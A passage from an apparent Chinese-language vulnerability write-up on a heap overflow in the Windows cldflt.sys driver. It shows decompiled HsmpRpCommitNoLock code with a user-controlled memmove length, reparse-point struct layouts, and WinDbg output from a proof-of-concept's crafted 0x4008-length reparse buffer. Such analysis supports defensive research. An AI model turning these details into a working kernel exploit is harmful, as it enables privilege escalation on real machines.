style="display:flex;"><span> v58<span style="color:#f92672">=</span> v11<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v8<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0xAu</span> )</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v8<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>);</span></span><span style="display:flex;"><span> v59<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">=</span> v57;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v57<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">'</span>pReF<span style="color:#960050;background-color:#1e0010">'</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> v57);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v60<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v59;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ((v60<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFFFFCu</span>i64)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0x3FFC</span> )<span style="color:#75715e">// 12 偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">=</span> (v60<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFC</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)v9 )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">|=</span><span style="color:#ae81ff">1u</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)v9<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v9)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v61<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v59;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)<span style="color:#f92672">=</span> v61;</span></span><span style="display:flex;"><span> v58[v61]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span></code></pre></div><p>继续审查代码，发现在<code>HsmpRpCommitNoLock</code>中有如下代码，在do while循环中调用memmove函数时，传入的src来源于<code>HsmpRpReadBuffer</code>解压后的<code>element[10]</code>数据，dst为<code>ExAllocatePoolWithTag</code>分配的大小为0x4000的内存。长度参数来源于<code>ElementInfos[10].Length</code>，不难看出由此可以造成越界写入，且用户可控。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> v32<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (v9<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x80000000</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>i64 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)P<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>;</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)v54<span style="color:#f92672">&amp;&amp;</span> (_WORD)v55 )</span></span><span style="display:flex;"><span> v167<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v8[v54];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> v167<span style="color:#f92672">=</span> v32;</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> PoolWithTag<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(PagedPool,<span style="color:#ae81ff">0x4000u</span>i64,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span> v142<span style="color:#f92672">=</span> PoolWithTag;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)PoolWithTag;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( PoolWithTag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(PoolWithTag,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x4000u</span>i64);</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span> InputBuffer;</span></span><span style="display:flex;"><span> v58<span style="color:#f92672">=</span> v11<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v8<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0xAu</span> )</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v8<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>);</span></span><span style="display:flex;"><span> v59<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">=</span> v57;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v57<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">'</span>pReF<span style="color:#960050;background-color:#1e0010">'</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v58<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> v57);</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">+=</span> v109;</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>) )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">|=</span><span style="color:#ae81ff">1u</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">=</span> (v113<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFC</span>;</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">+=</span> v114;</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> v117<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)v167;</span></span><span style="display:flex;"><span> v107<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)Src;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">=</span> (v118<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFC</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">17</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span>)<span style="color:#f92672">=</span> v119;</span></span><span style="display:flex;"><span> v121<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v59;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v58<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>)<span style="color:#f92672">=</span> v121;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">&amp;</span>v58[v121]<span style="color:#f92672">!=</span> v117 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(<span style="color:#f92672">&amp;</span>v58[v121], v117, v120);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> v125<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v126<span style="color:#f92672">=</span> v125;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(HSM_ELEMENT_INFO<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v58[<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v125<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>]<span style="color:#f92672">=</span> v124<span style="color:#f92672">-></span>ElementInfos[v125];</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(<span style="color:#f92672">&amp;</span>v58[<span style="color:#f92672">*</span>v59], (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)v124<span style="color:#f92672">+</span> v124<span style="color:#f92672">-></span>ElementInfos[v125].Offset, v124<span style="color:#f92672">-></span>ElementInfos[v125].Length);</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v125;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v58[<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v126<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v59;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v59<span style="color:#f92672">+=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v58[<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v126<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v125<span style="color:#f92672">&lt;</span> v124<span style="color:#f92672">-></span>NumberOfElements );</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v14 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExFreePoolWithTag</span>(v14,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExFreePoolWithTag</span>(v11,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>搜索<code>Reparse point RtlCompressBuffer</code>，找到文章，根据<a href="https://ipvb.gitee.io/windows/2020/04/24/RealPath/" target="_blank">文章</a><code>_REPARSE_DATA_BUFFER</code>定义如下，可以知道传入<code>HsmpRpiDecompressBuffer</code>的是<code>REPARSE_DATA_BUFFER</code>，其中<code>ReparseTag</code>为<code>IO_REPARSE_TAG_CLOUD_3</code> 值<code>0x9000301A</code>
并且在结构体<code>HsmReparseBufferRaw</code>的<code>RawData</code>成员中存储了由<code>(RtlCompressBuffer</code>压缩的数据<code>HsmReparseBufferRaw</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Handled by cldflt.sys!HsmpRpReadBuffer</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> USHORT Flags;<span style="color:#75715e">// Flags (0x8000 = not compressed)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Length;<span style="color:#75715e">// Length of the data (uncompressed)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BYTE RawData[<span style="color:#ae81ff">1</span>];<span style="color:#75715e">// To be RtlDecompressBuffer-ed</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } HsmReparseBufferRaw;</span></span></code></pre></div><p><code>_REPARSE_DATA_BUFFER</code>定义</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _REPARSE_DATA_BUFFER {</span></span><span style="display:flex;"><span> ULONG ReparseTag;<span style="color:#75715e">// Reparse tag type</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT ReparseDataLength;<span style="color:#75715e">// Length of the reparse data</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Reserved;<span style="color:#75715e">// Used internally by NTFS to store remaining length</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">union</span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_SYMLINK</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// Handled by nt!IoCompleteRequest</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> USHORT SubstituteNameOffset;</span></span><span style="display:flex;"><span> USHORT SubstituteNameLength;</span></span><span style="display:flex;"><span> USHORT PrintNameOffset;</span></span><span style="display:flex;"><span> USHORT PrintNameLength;</span></span><span style="display:flex;"><span> ULONG Flags;</span></span><span style="display:flex;"><span> WCHAR PathBuffer[<span style="color:#ae81ff">1</span>];</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Example of distinction between substitute and print names:</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> // mklink /d ldrive c:\</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> // SubstituteName: c:\\??\</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> // PrintName: c:\</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span> } SymbolicLinkReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_MOUNT_POINT</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// Handled by nt!IoCompleteRequest</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> USHORT SubstituteNameOffset;</span></span><span style="display:flex;"><span> USHORT SubstituteNameLength;</span></span><span style="display:flex;"><span> USHORT PrintNameOffset;</span></span><span style="display:flex;"><span> USHORT PrintNameLength;</span></span><span style="display:flex;"><span> WCHAR PathBuffer[<span style="color:#ae81ff">1</span>];</span></span><span style="display:flex;"><span> } MountPointReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_WIM</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// Handled by wimmount!FPOpenReparseTarget->wimserv.dll</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// (wimsrv!ImageExtract)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> GUID ImageGuid;<span style="color:#75715e">// GUID of the mounted VIM image</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BYTE ImagePathHash[<span style="color:#ae81ff">0x14</span>];<span style="color:#75715e">// Hash of the path to the file within the</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// image</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } WimImageReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_WOF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// NTFS (Windows 10+)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">//-- WOF_EXTERNAL_INFO --------------------</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Wof_Version;<span style="color:#75715e">// Should be 1 (WOF_CURRENT_VERSION)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Wof_Provider;<span style="color:#75715e">// Should be 2 (WOF_PROVIDER_FILE)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">//-- FILE_PROVIDER_EXTERNAL_INFO_V1 --------------------</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG FileInfo_Version;<span style="color:#75715e">// Should be 1 (FILE_PROVIDER_CURRENT_VERSION)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG</span></span><span style="display:flex;"><span> FileInfo_Algorithm;<span style="color:#75715e">// Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } WofReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_APPEXECLINK</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> ULONG StringCount;<span style="color:#75715e">// Number of the strings in the StringList, separated</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// by '\0'</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> WCHAR StringList[<span style="color:#ae81ff">1</span>];<span style="color:#75715e">// Multistring (strings separated by '\0',</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// terminated by '\0\0')</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } AppExecLinkReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Structure for IO_REPARSE_TAG_WCI (0x80000018)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> ULONG Version;<span style="color:#75715e">// Expected to be 1 by wcifs.sys</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Reserved;</span></span><span style="display:flex;"><span> GUID LookupGuid;<span style="color:#75715e">// GUID used for lookup in wcifs!WcLookupLayer</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT WciNameLength;<span style="color:#75715e">// Length of the WCI subname, in bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> WCHAR WciName[<span style="color:#ae81ff">1</span>];<span style="color:#75715e">// The WCI subname (not zero terminated)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } WcifsReparseBuffer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Handled by cldflt.sys!HsmpRpReadBuffer</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> USHORT Flags;<span style="color:#75715e">// Flags (0x8000 = not compressed)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Length;<span style="color:#75715e">// Length of the data (uncompressed)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BYTE RawData[<span style="color:#ae81ff">1</span>];<span style="color:#75715e">// To be RtlDecompressBuffer-ed</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> } HsmReparseBufferRaw;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Dummy structure</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span> UCHAR DataBuffer[<span style="color:#ae81ff">1</span>];</span></span><span style="display:flex;"><span> } GenericReparseBuffer;</span></span><span style="display:flex;"><span> } DUMMYUNIONNAME;</span></span><span style="display:flex;"><span>} REPARSE_DATA_BUFFER,<span style="color:#f92672">*</span>PREPARSE_DATA_BUFFER;</span></span></code></pre></div><p>在<a href="https://github.com/ladislav-zezula/FileTest" target="_blank">这个Github仓库</a>中实现了对Reparse point的解析，其中定义了<code>HSM_REPARSE_DATA</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HSM_ELEMENT_INFO</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> USHORT Type;<span style="color:#75715e">// Type of the element (?). One of HSM_ELEMENT_TYPE_XXX</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Length;<span style="color:#75715e">// Length of the element data in bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Offset;<span style="color:#75715e">// Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>} HSM_ELEMENT_INFO,<span style="color:#f92672">*</span>PHSM_ELEMENT_INFO;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HSM_DATA</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ULONG Magic;<span style="color:#75715e">// 0x70527442 ('pRtB') for bitmap data, 0x70526546 ('FeRp') for file data</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Crc32;<span style="color:#75715e">// CRC32 of the following data (calculated by RtlComputeCrc32)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG Length;<span style="color:#75715e">// Length of the entire HSM_DATA in bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Flags;<span style="color:#75715e">// HSM_DATA_XXXX</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT NumberOfElements;<span style="color:#75715e">// Number of elements</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> HSM_ELEMENT_INFO ElementInfos[<span style="color:#ae81ff">1</span>];<span style="color:#75715e">// Array of element infos. There is fixed maximal items for bitmap and reparse data</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>} HSM_DATA,<span style="color:#f92672">*</span>PHSM_DATA;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HSM_REPARSE_DATA</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> USHORT Flags;<span style="color:#75715e">// Lower 8 bits is revision (must be 1 as of Windows 10 16299)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#75715e">// Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> USHORT Length;<span style="color:#75715e">// Length of the HSM_REPARSE_DATA structure (including "Flags" and "Length")</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> HSM_DATA FileData;<span style="color:#75715e">// HSM data</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>} HSM_REPARSE_DATA,<span style="color:#f92672">*</span>PHSM_REPARSE_DATA;</span></span></code></pre></div><p>对应在<code>REPARSE_DATA_BUFFER</code>的偏移如下</p><pre tabindex="0"><code>0:000> dt pa
Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER*
0x000001e0`ef867690
+0x000 ReparseTag : 0x9000301a
+0x004 ReparseDataLength : 0x4008
+0x006 Reserved : 0
+0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-SymbolicLinkReparseBuffer>
+0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-MountPointReparseBuffer>
+0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-WimImageReparseBuffer>
+0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-WofReparseBuffer>
+0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-AppExecLinkReparseBuffer>
+0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-WcifsReparseBuffer>
+0x008 hsm_reparse_data : _HSM_REPARSE_DATA
+0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::&lt;unnamed-tag>::&lt;unnamed-type-GenericReparseBuffer>
0:000> dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698))
(*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA]
[+0x000] Flags : 0x8001 [Type: unsigned short] // 8
[+0x002] Length : 0x4008 [Type: unsigned short] // 10
[+0x004] FileData [Type: _HSM_DATA] // 12
